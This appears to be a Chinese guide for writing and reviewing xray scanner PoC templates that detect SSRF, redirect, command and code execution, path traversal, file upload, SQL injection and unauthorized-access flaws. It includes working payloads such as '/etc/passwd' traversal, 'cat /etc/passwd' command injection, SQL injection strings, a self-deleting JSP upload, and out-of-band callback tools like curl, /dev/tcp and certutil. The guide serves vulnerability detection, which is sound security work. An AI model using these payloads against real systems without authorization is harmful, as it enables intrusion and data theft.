# 漏洞检测部分

## SSRF

!> 切记SSRF检测的是能否正确从服务端`发出`请求，要严格与redirect区分。同时尽量去检测有回显的情况，如果确实无回显，那么使用反连平台即可

### 无回显情况

> 这里的无回显指的是访问指定的地址没有`确切的返回结果`或者`报错信息`

无回显的SSRF较为容易进行匹配，在触发请求的地点使用`正确`的反连地址进行验证即可，同时在表达式中对反连平台返回的结果进行匹配。成功匹配就说明成功发送了

```yaml
name: poc-yaml-ssrf-reverse
transport: http
set:
	reverse: newReverse()
	reverseURL: reverse.url
rules:
	r0:
		request:
			cache: true
			method: POST
			path: /xxx
			headers:
				Content-Type: application/json
			body: |
				{"content": "include:\n remote: {{reverseURL}}"}
		expression: response.status == 200 && reverse.wait(5)
```

### 有回显情况

这个与无回显正好相反，访问指定的站点之后可能会出现一些可以进行匹配的特征。这里总结下之前见过的一些情况

#### 文件读取类型

```yaml
r0:
	request:
		cache: true
		method: POST
		path: /xxx
		headers:
			Content-Type: application/x-www-form-urlencoded
		body: |
			url=file:///{{filename}}
		follow_redirects: false
	expression: |
		response.status == 500 && response.body.bcontains(b"\"exception\":\"java.io.FileNotFoundException\",")
```

使用协议读取文件时，可以尝试去读取系统中存在的文件或者不存在的文件，依据response的内容与状态写出对应的匹配表达式即可

#### 访问外部站点类型(不是很推荐)

```yaml
r0:
	request:
		cache: true
		method: GET
		path: /xxx/http/example.com
		follow_redirects: true
	expression: response.status == 200 && response.body.bcontains(b"<title>Example Domain</title>") && response.body.bcontains(b"<h1>Example Domain</h1>")
```

!> 当访问外部站点时，一定需要注意的是能够访问的只是`公共站点`，一定不要请求一些私有项目的公开页面或者文件

这个时候我们只要尝试去匹配返回结果中关于请求站点的相关内容即可。但是注意除了被访问页面的内容之外，我们一定要去匹配一些和被访问站点不同的内容，比如说状态码以及其他存在漏洞的站点中存在的内容

> 但是这种方式是非常不推荐的，一方面是有目标不出网的可能性，另一方面当匹配内容与目标站点区分度不大时会有误报的风险

#### 访问内部站点类型

```yaml
r0:
	request:
		cache: true
		method: GET
		path: /wp-admin/admin-ajax.php?action=formcraft3_get&URL=http://127.0.0.1:0
		follow_redirects: false
	expression: |
		response.status == 200 && response.body.bcontains(b"cURL error 3: ") && response.body.bcontains(b"failed")
```

这个例子说明了通过访问本地地址来验证SSRF漏洞的存在。一般这种情况下

- 尝试访问开放的端口，判断对应端口里返回的信息进行判断
	- 不推荐，开放的端口可能过于随机，且匹配的内容过于不固定
- 尝试访问一般情况下一定不开放或者不存在的端口，判断返回的报错信息进行判断
	- 较为推荐的写法

## XSS

> xss的内容也需要确定使用xray现有的xss模块检测后无检出后再进行提交

与其他类型的poc类似，xss的poc必然有一条内容是关于使用xss注入的。那么

- 在关于xss注入的rule中
	1. 关于注入的语句
		- 要求访问内容无危害，不可写入真正窃取用户cookie等内容的语句
		- 正确地进行URL编码，保证注入的语句是通用的
	 2. 关于匹配的内容
		- 可以直接匹配我们传入的拼接语句，但是也一定要匹配系统中其他的特征内容，保证规则整体是较强的

同时xss注入也不是全无危害，注意对于存储型xss这种会一直存储在对方服务器中的方式，这里并不会进行收取，因为我们首先需要保证的就是对目标服务器无危害

## Redirect （URL跳转）

跳转漏洞发生时，说明从当前站点出发，下一个Location是我们所需要跳转的站点；跳转之后，所访问站点的Refer是先前的站点。一切都与SSRF有着不同之处

同时当有Redirect漏洞时，Location或者其他部分中的内容一定是经过系统处理后才进行输出的，具有一定的格式

这样来看，似乎大部分情况下我们只需要对response中的Location进行匹配即可，但是这里有几个点需要注意一下

### 关于follow_redirects

在Redirect此类的漏洞中，如果目标站点无特殊情况（例如访问后状态码确实不属于300~400的范围），那么首先就要要求request中的follow_redirects选项一定要手动写成false

> 默认情况下，request中的follow_redirects选项为true，那么就会导致发生跳转时获取的response是最终跳转页面中的内容

```yaml
rules:
    r0:
        request:
            method: GET
            path: /
            headers:
                X-Forwarded-Host: //xxx
            follow_redirects: false
        expression: '"(?m)^(?:Location\\s*?:\\s*?)(?:https?://|//)(?:[a-zA-Z0-9\\-_\\.@]*)xxx\\.sh.*$".bmatches(response.raw_header)'
```

### 关于所需要跳转的站点

我们想要使用原理去验证Redirect漏洞的存在，就要去选择一个确切的站点去进行访问。这个内容一般情况下不固定，用户自由选择即可。唯一需要注意的一点就是一定需要选择一些`国内外均能够进行访问`，`返回内容简单`，`不牵扯隐私内容`的站点去进行访问

?> 对于这些内容，可以参考现有的poc模版相关内容，当然允许的情况下也可以是随机值

### 关于匹配的内容

匹配的内容不需要过于复杂，但是这里`只`有两种格式供给选择

- `推荐`使用**正则**去对整个Location的内容去进行匹配，保证匹配的内容格式是发生跳转时Location中内容的格式

```yaml
rules:
    r0:
        request:
            method: GET
            path: /
            headers:
                X-Forwarded-Host: //xxx
            follow_redirects: false
        expression: '"(?m)^(?:Location\\s*?:\\s*?)(?:https?://|//)(?:[a-zA-Z0-9\\-_\\.@]*)xxx\\.sh.*$".bmatches(response.raw_header)'
```

- 当返回内容的特征中的内容非常固定时，`可以`使用\=\=进行去进行匹配，这种情况下对格式的要求更为严苛

```yaml
r0:
	request:
		cache: true
		method: GET
		path: /new/newhttp:/interact.sh?
		follow_redirects: false
	expression: response.status == 302 && response.headers["location"] == "http:/interact.sh?" && response.body.bcontains(b"http:/interact.sh?\">Found</a>.")
```

#### 为什么不能使用contains去匹配

contains表明了匹配的内容中只要包含了我们所给出的特征即可，并没有格式的要求。那么这就会导致误报的问题，这里举出一个例子进行分析，这个例子是之前审核中所遇到过的一个情景

```text
一个网站并没有Redirect漏洞，但是当我们访问发出的path时，如果系统里并没有对于这条path的路由，也会发生302跳转，同时把访问地址的全部内容（schema+uri+path）全部塞入Location中
```

那么当跳转后，由于Location也仅仅只是当前站点的地址，并没有访问到我们所期望的站点。但是这时由于我们使用了contains，且Location中也有相关内容，那么就会导致误报的问题

所以综上，在redirect漏洞的探测中，我们一定不要去使用contains去进行匹配

## Remote Command Execution（远程命令执行）

远程命令执行漏洞的出现一般伴随着目标系统上命令的执行。系统的类型有多种，执行的名称不同，输出的结果也不尽相同，常见的环境大概有linux，windows以及busybox，分别对应着常见的路由器环境以及服务器环境

那么为了尽可能地减少漏报的风险，就要要求我们充分分析目标web系统所能够运行的平台，统一在编写相关rules时为每一种可能都写出相关的rule

> 不同web系统的情况不尽相同，也许某些平台中不存在的命令在其他系统中是恒久存在的，审核时只需要需要注意判断所执行的命令在目标的系统中是否为通用的即可

例如在不同系统中读取文件时，我们读取的文件一般是不同的

```text
linux   => 使用cat命令  => 读取/etc/passwd等系统中存在的文件
windows => 使用type命令 => 读取win.ini等文件
```

那么我们在对应的rule中需要一定要写出

```yaml
rules:
	linux:
		request:
			...
			path: /dosomething?cmd=cat%20/etc/passwd
			...
		expression: response.body_string.contains("root")
	windows:
			...
			path: /dosomething?cmd=type%C://windows//win.ini
			...
		expression: response.body_string.contains("extension")
...
expression: linux() && windows()
```

### 有回显命令执行

> 对于有回显的命令执行，虽然容易测试与编写，但是请注意编写过程中的一些问题

- 那么在执行输出命令的rule中
	- 可以且建议使用的方案
		- 可以选择使用读取文件的指令读取出系统中通用且稳定存在的文件来判断结果
		- 可以选择使用读取文件的指令读取出web系统中通用的配置文件等内容，例如java系统常见的pom.xml等（较为推荐）
		- linux中可以选择使用rev，expr等命令处理输入内容后再进行判断，对于内容的严谨性可以参阅通用部分的set内容
		- 一些web系统中可以选择在能访问的文件中直接写入文件内容，通过访问产生的文件来判断漏洞的存在（不是很推荐，会残留文件，如果删除的话需要多发一个包）
	- 不可以且一般严禁执行的方案
		- 使用`echo`之类的输出语句`直接`输出一个内容，然后在返回里查找这个内容，此类POC很容易误报和漏报
		- 尽量不要使用类似`id`，`uname`这种输出不稳定的指令来进行判断，在不同的环境中输出可能会有些许的差异

同时考虑到有些32位系统整数上限可能低于`2^31`和数字过短可能误报，目前要求乘法两个数字的取值范围必须在 `40000` 和 `44800` 之间，加法两个数字必须在 `800000000` 和 `1000000000` 之间

### 无回显命令执行

无回显命令执行要求我们使用反连平台进行测试，只要反连平台接收到相关的请求并能正确处理就说明目标系统成功执行相关命令

> 需要注意，如果目标允许的情况下，使用反连平台时要尽可能地避免掉dns请求，尽量简化配置流程

!> 漏洞如果能通过回显检测，就不要使用反连平台，鼓励将公开的无回显的POC改为有回显的。比如公开的struts2漏洞POC很多是反弹shell的POC，但几乎所有struts2的POC都可以修改为有回显的POC

一般来说，我们使用的能够发出请求的命令有这几种，这里分别引申出使用中存在的隐患问题

```text
在linux系统中，我们一般的选择有

* curl                => http请求 某些系统可能不自带，需要额外进行安装，使用前需要充分考虑目标系统中的状况
* ping                => dns请求  系统中一定自带，可以选择使用，但是优先级较低
* /dev/tcp raw socket => dns请求  系统中一定自带，可以选择使用，但是优先级较低

其他类似nc等系统中存在概率不大且不是特别常用的指令这里不再讲解，可以依照功能分别对应隐患
```

```text
在windows系统中，我们一般的选择有

* curl     => http请求，windows系统中一定一定需要考虑目标系统中韩是否存在，虽然现在powershell中会以别名的形式存在，但是使用前千万要充分考虑漏报的风险
* ping     => dns请求，系统中一定自带，windows中推荐进行使用
* certutil => dns请求，系统中一定自带，windows中推荐使用

其他的命令例如Invoke-WebRequest可以参考上面给出的内容自我衡量，这里不多做要求
```

?> 对于目标系统不出网的情况这里不多加赘述，可以参考第四章常见问题中内容

## Remote Code Execution（远程代码执行）

与远程命令执行类似，这个也能够直接执行相关命令， 但是不同是的，这个直接执行的是对应的语言代码，一般情况下与系统无关，那么我们通常并不用考虑它在不同系统中的兼容性问题

### 有回显代码执行

> 与所有能够回显的判断方式类似，我们需要统一规范的就是一定不要在body中直接去匹配在request中出现的内容

- 各种 rce 通常都可以直接使用整数相乘相加或者md5的方法，然后再查找返回结果，这样只有在代码真正被执行的时候才会得到预期的结果
- 同时如果能把代码输出的结果反馈到response的header中，这或许是一个好的选择，在现在的反馈中一般没有出现过误报的问题（推荐）
- 或者可以选择以读取文件的方式来判断漏洞的存在

#### php中可能出的问题

php在现在来看使用的基数仍然够大，且配置灵活，很容易在一些我们想不到的点中出现问题

那么在php这门语言的环境中，一般我们有以下的要求

* 请不要使用`system`、`shell_exec`、`phpinfo`等函数测试漏洞，容易出现误报和漏报
	1.  如果对方本身就是一个phpinfo页面，无法判断是否是成功执行了代码，导致出现误报
	2.  如果对方网站运行在一些虚拟主机环境下，如cpanel，则命令执行函数很可能已经被禁用，此时再用`system`等函数测试漏洞则会出现漏报
* 请不要使用`echo`、`print`、`var_dump`之类的输出语句直接输出一个内容，然后在返回里查找这个内容，此类POC很容易误报和漏报
	1.  如果对方页面本身是一个类似phpinfo的调试页面，会将你的数据包细节完全打印出来，那么并不能证明存在命令执行漏洞
	2.  如果对方安装了xdebug等调试类扩展，`var_dump`等函数输出可能存在差异导致查找不成功

### 无回显代码执行

无回显命令执行要求我们使用反连平台进行测试，只要反连平台接收到相关的请求并能正确处理就说明目标系统成功执行相关命令

> 需要注意，如果目标允许的情况下，使用反连平台时要尽可能地避免掉dns请求，尽量简化配置流程

> 漏洞如果能通过回显检测，就不要使用反连平台，鼓励将公开的无回显的POC改为有回显的

与命令执行不同，当我们需要发出请求的时候，一定不要再去使用相关方法去调用系统命令，直接使用语言内提供的能力即可，这样
- 一方面简化了请求的流程，避免了繁琐的调用流程
- 另一方面防止差异再次扩大到系统的层级上，即然能有中间层已经替我们解决了这个问题，就不要再使用底层的内容

> 对于目标系统不出网的情况这里不多加赘述，可以参考第四章常见问题中内容

## path traversal （目录穿越/任意文件读取）

!> 在验证这类漏洞之前，如果path过于常见（例如根目录或者页面中能够发掘出的路径） 一定要先使用xray自身的path-traversal插件进行探测后再编写相关poc，如果xray本身就能够探测出相关漏洞，那么按照规则会不予收取

```yaml
name: poc-yaml-joomla-cve-2021-28377-fileread
manual: true
transport: http
rules:
	r0:
		request:
			cache: true
			method: GET
			path: /index.php?f=../../../../../../../etc/passwd
		expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
	r1:
		request:
			cache: true
			method: GET
			path: /index.php?f=../../../../../../../Windows/win.ini
		expression: response.status == 200 && response.body.bcontains(b"for 16-bit app support")
expression: r0() || r1()
detail:
	author: Chaitin
	links:
		- http://example.com
```

在这类漏洞中，必然至少有一个rule会去访问我们所需要读取的文件，那么

- 对于`读取文件`的rule中
	1. 关于读取的文件
		- 需要按照漏洞的利用方式去读取相关的文件
		- 如果目标系统中存在着某些通用的配置文件，那么首先推荐去读取这些web系统内的文件，尽可能地减少发包量
		- 其次我们再去考虑系统中的文件，这部分内容建议参考现在我们给出的poc模版相关内容。同时需要注意的是，读取系统文件时，我们需要充分考虑目标web系统能够被架设在哪些系统上，对于可行的系统都要写出相应的rule去进行匹配
	2. 关于匹配的内容
		- 这部分直接依据所读取的文件写出对应的匹配语句即可。但是需要注意的是，除了固有文件内容的匹配之外，如果页面内仍有其他特征内容，这里也是非常推荐去增加匹配这些内容

其他rule的内容需要按照漏洞的具体内容按需编写

## file upload（文件上传）

### 普通情况

```yaml
name: poc-yaml-test-upload-cve-xxx-xxxx
manual: true
transport: http
set:
	s1: randomInt(1000000000, 9000000000)
	s2: randomLowercase(20)
	rBoundary: randomLowercase(8)
rules:
	r0:
		request:
			cache: true
			method: POST
			path: /UploadFileData?action=upload_file&foldername=%2e%2e%2f&filename={{s2}}.jsp
			body: >-
				------WebKitFormBoundary{{rBoundary}}
				Content-Disposition: form-data; name="myFile"; filename="test.jpg"
				
				<% out.println(\"{{s1}}\"); new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
				------WebKitFormBoundary{{rBoundary}}--
			headers:
				Content-Type: multipart/form-data
		expression: response.status == 200 && response.body.bcontains(b"showSucceedMsg")
	r1:
		request:
			cache: true
			method: GET
			path: /xxxPath/{{s2}}.jsp
		expression: response.status == 200 && response.body.bcontains(bytes(string(s1)))
expression: r0() && r1()
detail:
	author: chaitin
	links:
		- http://example.com
```

这里给出一个对于file-upload漏洞的范例，也许不同漏洞的文件上传之间互有差异，但是大体上我们需要符合以下几点规则

> 一般来说文件上传类型的poc会有核心的两个rule，一个负责`文件上传`，一个负责`读取所上传的文件`。也许某些poc只有上传的逻辑，但是无关紧要，我们只要对照着去分析poc中给出的内容即可，按需去判断这些rule能不能成为漏洞判断的标准

- 在关于`文件上传`的rule中
	1. 如果需要`boundary`，那么我们需要对这个`boundary`内容使用`set`进行随机化处理
	2. 对于上传的文件名称，我们分以下几种情况进行讨论
		- `能自定义上传文件名称`时，**必须**随机化产生文件名称，之后再进行上传处理
		- 如果`上传的文件名称由系统产生`，且`生成的文件名称为随机值`时，如果response中存在相关文件的名称，那么我们可以在output中提取出文件名称并进行使用
		- 如果`上传的文件名称由系统产生`，且`生成的文件就是系统本身的文件`，即产生了文件覆盖的现象，那么无论如何，我们都不要尝试去上传对应的文件，那么这个时候我们就需要找到另外的方法去验证漏洞的存在与否
	 3. 对于上传的文件的文件内容，我们有以下几点的规定
		 - 对于上传内容，`必须`进行随机化处理，在set中声明随机的内容
		 - 对于上传内容，可以的话`推荐`编码处理后再进行匹配，但是不做强求
		 - 如果上传的文件格式对于目标web系统是能够执行的，那么我们`一定`要添加删除的逻辑(比如php的unlink或者java的java.io.File)
	 4. 对于header中的内容，必须和上传的文件内容相匹配，这个需要具体参考上传的文件内容
	 5. 对于expression中的内容，这里不做强制规定，但是仍要有以下的限制
		 - 需要符合response的状态
		 - 不强求匹配response中的内容，但是可以添加一些正确且通用的逻辑
- 在`验证上传`的rule中
	 1. 需要符合目标系统去访问产生的对应文件
	 2. 大部分情况下我们都要尝试去匹配之前我们产生的随机值内容，这里需要注意在expression中使用相应的函数时，需要参考文档正确处理类型，防止出现无法匹配的现象

> 除去上边这些内容，我们同时需要保证全部的expression连起来时规则是相对较强，是不容易在一些特殊的系统上产生误报的

### 特殊情况

上面这些说明了常见情况下的上传脚本文件的验证方式，如果依据上述内容排查下来，仍然不符合需求的话，这里提出几个常见的问题：

- 对于文件上传漏洞，如果实在难以找到无害化上传的方法，应该如何去进行判断poc是否可行？
	- 对于这个问题，如果仍然希望写出无害化的poc，那么我们可以抛去原理验证的方式，尝试去找一些`一定`只有存在漏洞的版本才能出现的信息，通过匹配这些内容，来侧方位地验证漏洞的存在

> 但是寻常情况下比较不推荐使用该方法进行验证，

- 如果上传的文件内容是二进制文件，比如zip，暂时没有办法实现上述所说的随机化内容，应该如何处理？
	- 这种情况下现阶段的情况下不是很推荐再去编写`yaml poc`进行验证，可以等待使用`go poc`完成随机化的处理

## SQL Injection（SQL注入）

对于sql注入相关漏洞的检测，大致分为三种类型，这里分别进行分析

!> 测试SQL注入漏洞，无论是哪种类型，都请不要使用`user()`、`version()`等函数来辅助验证漏洞的存在与否。此类规则**太过宽泛**，不同系统之间显示的内容都有不同的可能，在匹配时具有一定的随机性

### 有回显注入（error based and other）

有回显的注入检测比较简单，这里以报错注入为例进行讲解

```yaml
name: poc-yaml-test-sqli-echo-based
manual: true
transport: http
set:
	r1: randomInt(8000, 10000)
rules:
	r0:
		request:
			cache: true
			method: GET
			path: /xxx.jsp?id=1%20union%20select%201,2,sys.fn_sqlvarbasetostr(HashBytes('MD5','{{r1}}')),db_name(1),5,6,7
		expression: response.status == 200 && response.body.bcontains(bytes(substr(md5(string(r1)), 0, 31)))
expression: r0()
detail:
	author: chaitin
	links:
		- http://example.com
```

在这类的poc中，至少有一个rule会是关于sql注入的语句，但是对于结果的展示可能并不会在同一个rule中，所以下面分为两个部分讲解审核中需要注意的问题

- 对于存在`sql注入语句`的rule
	1. 对于给出的SQL注入语句
		- 语句正确无误，能够符合目标系统检出对应的漏洞，必要时可以添加一些绕过方法增加检出率
		- 对于需要验证的变量，`一定`要使用对应sql中能够使用的编码函数处理后再进行匹配，绝对不可以使用`固定值`或者`原内容`
- 对于`验证注入结果`的rule
	1. 注意返回值的编码问题，需要与注入语句中所给出的内容相同
	2. 注意返回值的长度，在部分系统中，返回内容的长度和起始位置与直接编码的结果并不相同（`updatexml`、`extractvalue` 报错回显结果可能会被截断），这时就需要使用substr等函数截取后再进行匹配

### 时间盲注（time based）

时间盲注的检测要稍微复杂一些，同时存在着因为网络环境等误报漏报的问题，这里举例讲解如何尽可能地减少这种误报

```yaml
name: poc-yaml-test-sqli-time-based
manual: true
transport: http
set:
	randSecond1: randomInt(5, 7)
	randSecond2: randomInt(2, 4)
rules:
	r0:
		request:
			cache: false
			method: GET
			path: /xxx?keyword=%27%2B(select(0)from(select(sleep(0)))v)%2B%27/
		expression: response.status == 200
		output:
			undelayedLantency: response.latency
	r1:
		request:
			cache: false
			method: GET
			path: /xxx?keyword=%27%2B(select(0)from(select(sleep({{randSecond1}})))v)%2B%27/
		expression: response.latency - undelayedLantency >= randSecond1 * 1000 - 500 && response.status == 200 && response.body.bcontains(b"{\"code\":200")
	r2:
		request:
			cache: false
			method: GET
			path: /xxx?keyword=%27%2B(select(0)from(select(sleep({{randSecond2}})))v)%2B%27/
		expression: response.latency - undelayedLantency >= randSecond2 * 1000 - 500 && response.status == 200 && response.body.bcontains(b"{\"code\":200")
expression: r0() && r1()
detail:
	author: Chaitin
	links:
		- http://example.com
```

对于时间盲注来说，我们首先需要保证出了延时的不同，path的其他部分都要保证完全一致。那么当我们发送对应的payload时，至少是能排除掉因为访问路径或者参数的不同所导致的时间差异问题

同时这里分别说明一下基础的三个请求分别所对应的意义
- 第一个请求：延时为0，测出访问对应站点时的基础延时
- 第二个请求：延时一定不为0，且时长定在(5, 7)秒，通过延长一个较长的时间来发现是否发生一个延时，但是这个内容可能收到系统方面相关网络波动的影响分
- 第三个请求：延时一定不为0，且时长一定小于第二个请求中的延时，通过一个较短的时间判断这个延时一定是因为sql注入所发生的

那么依据上边所分析出来的内容，我们可以得到以下的要求

- 在第一条关于注入的rule中
	1. 关于注入的内容
		- 关于request的内容，除时间不同以外，`一定`要与第二条rule中的request信息保持一致
		- sleep的时间一定是`0s`
	2. 关于匹配的expression
		- 符合接口的返回内容即可，比较`推荐`在其中匹配一些特有的返回结果，尽可能地消除网络环境所带来的误报问题，但是不做强求
	3. 关于output的内容
		- 这条rule一定会有output的内容，其中的变量存储着这一条请求所花费的时间
- 在第二条关于注入的rule中
	1. 关于注入的内容
		- 关于request的内容，除时间不同以外，`一定`要与第一条rule中的request信息保持一致
		- sleep的时间需要设置随机值，同时随机值的最小值一定不能小于`3s`，避免数值过小带来的网络波动问题
	2. 关于匹配的expression
		- 一定需要对访问时间的差值进行比较，确保两个相似请求之间的时间差异全部是由sleep所造成的
		- 同时无特殊的情况下，`建议`除了时间差值的比较之外，其他的内容与第一条相同
- 在第三条关于注入的rule中
	- 这一条的内容与第二条除了时间的取值都相同即可

?> 这里强求对页面中的部分内容进行匹配，目的是为了作为目标系统的指纹，消除网络环境的影响，防止一些不相干的系统造成的误报。同时匹配的内容不用过多，体现出目标系统的独特性即可

### 布尔盲注（boolean based）

布尔盲注与时间盲注相似，都是一定会存在两个包含sql注入语句的rule，这里举例分析

```yaml
name: poc-yaml-test-sqli-boolean-based
manual: true
transport: http
set:
	s1: randomLowercase(5)
	a1: randomInt(1000, 9000)
	a2: randomInt(1000, 9000)
rules:
r0:
	request:
		cache: true
		method: POST
		path: /xxx.cgi
		headers:
			Content-Type: application/x-www-form-urlencoded
		body: USERDBDomains.Domainname=geardomain%27 and {{a1}}={{a2}} and %27{{s1}}%27=%27{{s1}}
		follow_redirects: true
	expression: response.body.bcontains(b"id=\"lblWarning\">User authentication Failed")
r1:
	request:
		cache: true
		method: POST
		path: /xxx.cgi
		headers:
			Content-Type: application/x-www-form-urlencoded
		body: USERDBDomains.Domainname=geardomain%27 and {{a1}}={{a1}} and %27{{s1}}%27=%27{{s1}}
		follow_redirects: true
	expression: response.body.bcontains(b"id=\"lblWarning\">User Login Failed for SSLVPN User")
expression: r0() && r1()
detail:
	author: Chaitin
	links:
		- http://example.com
```

大体的验证方法与实时间盲注相同，这里说明下几个需要注意的点
- 所匹配的页面内容一定是最终的内容，follow_redirects为true时需要匹配重定向后页面的内容
- 选取的匹配内容一定是条件为真或条件为假时所出现的`特有内容`，两者不可重叠，否则及其容易出现误报的现象

## unauth/idor（未授权访问/越权）

这个类型的poc所匹配的内容非常不固定，这里给出在验证中大致需要注意的问题

- 所访问的path一定是对应漏洞的path
- 所匹配的页面内容尽可能地突出当发生未授权访问或者越权时，这个页面中出现了什么特殊的内容
- 如果上述匹配的特征过少或者规则稍弱，建议增加指纹等的验证规则

这里举出审核中遇见的例子进行讲解

### H3C Unauth

```yaml
name: poc-yaml-test-unauth
manual: true
transport: http
rules:
	r1:
		request:
			cache: true
			method: GET
			path: /home.asp?userLogin.asp
		expression: response.status == 200 && response.body.bcontains(b"user_expire_time=") && response.body.bcontains(b"maintain_basic.asp") && "Server" in response.headers && response.headers["Server"].contains("H3C-Miniware-Webs")
expression: r1()
detail:
	author: Chaitin
	links:
		- http://example.com
```

- "Server" in response.headers && response.headers\["Server"\].contains("H3C-Miniware-Webs") 说明了需要验证的对象就是H3C系列的服务
- response.body.bcontains(b"maintain_basic.asp") 以及 response.body.bcontains(b"user_expire_time=") 说明了当发生未授权访问时，页面中相对于授权时会多出的内容
- 同时response.status == 200 尽可能地剔除了访问时产生404的页面，一定程度上节省开支

综上，我们可以判断这些条件足以使得此poc尽可能地避免误报，最终达成的效果会很好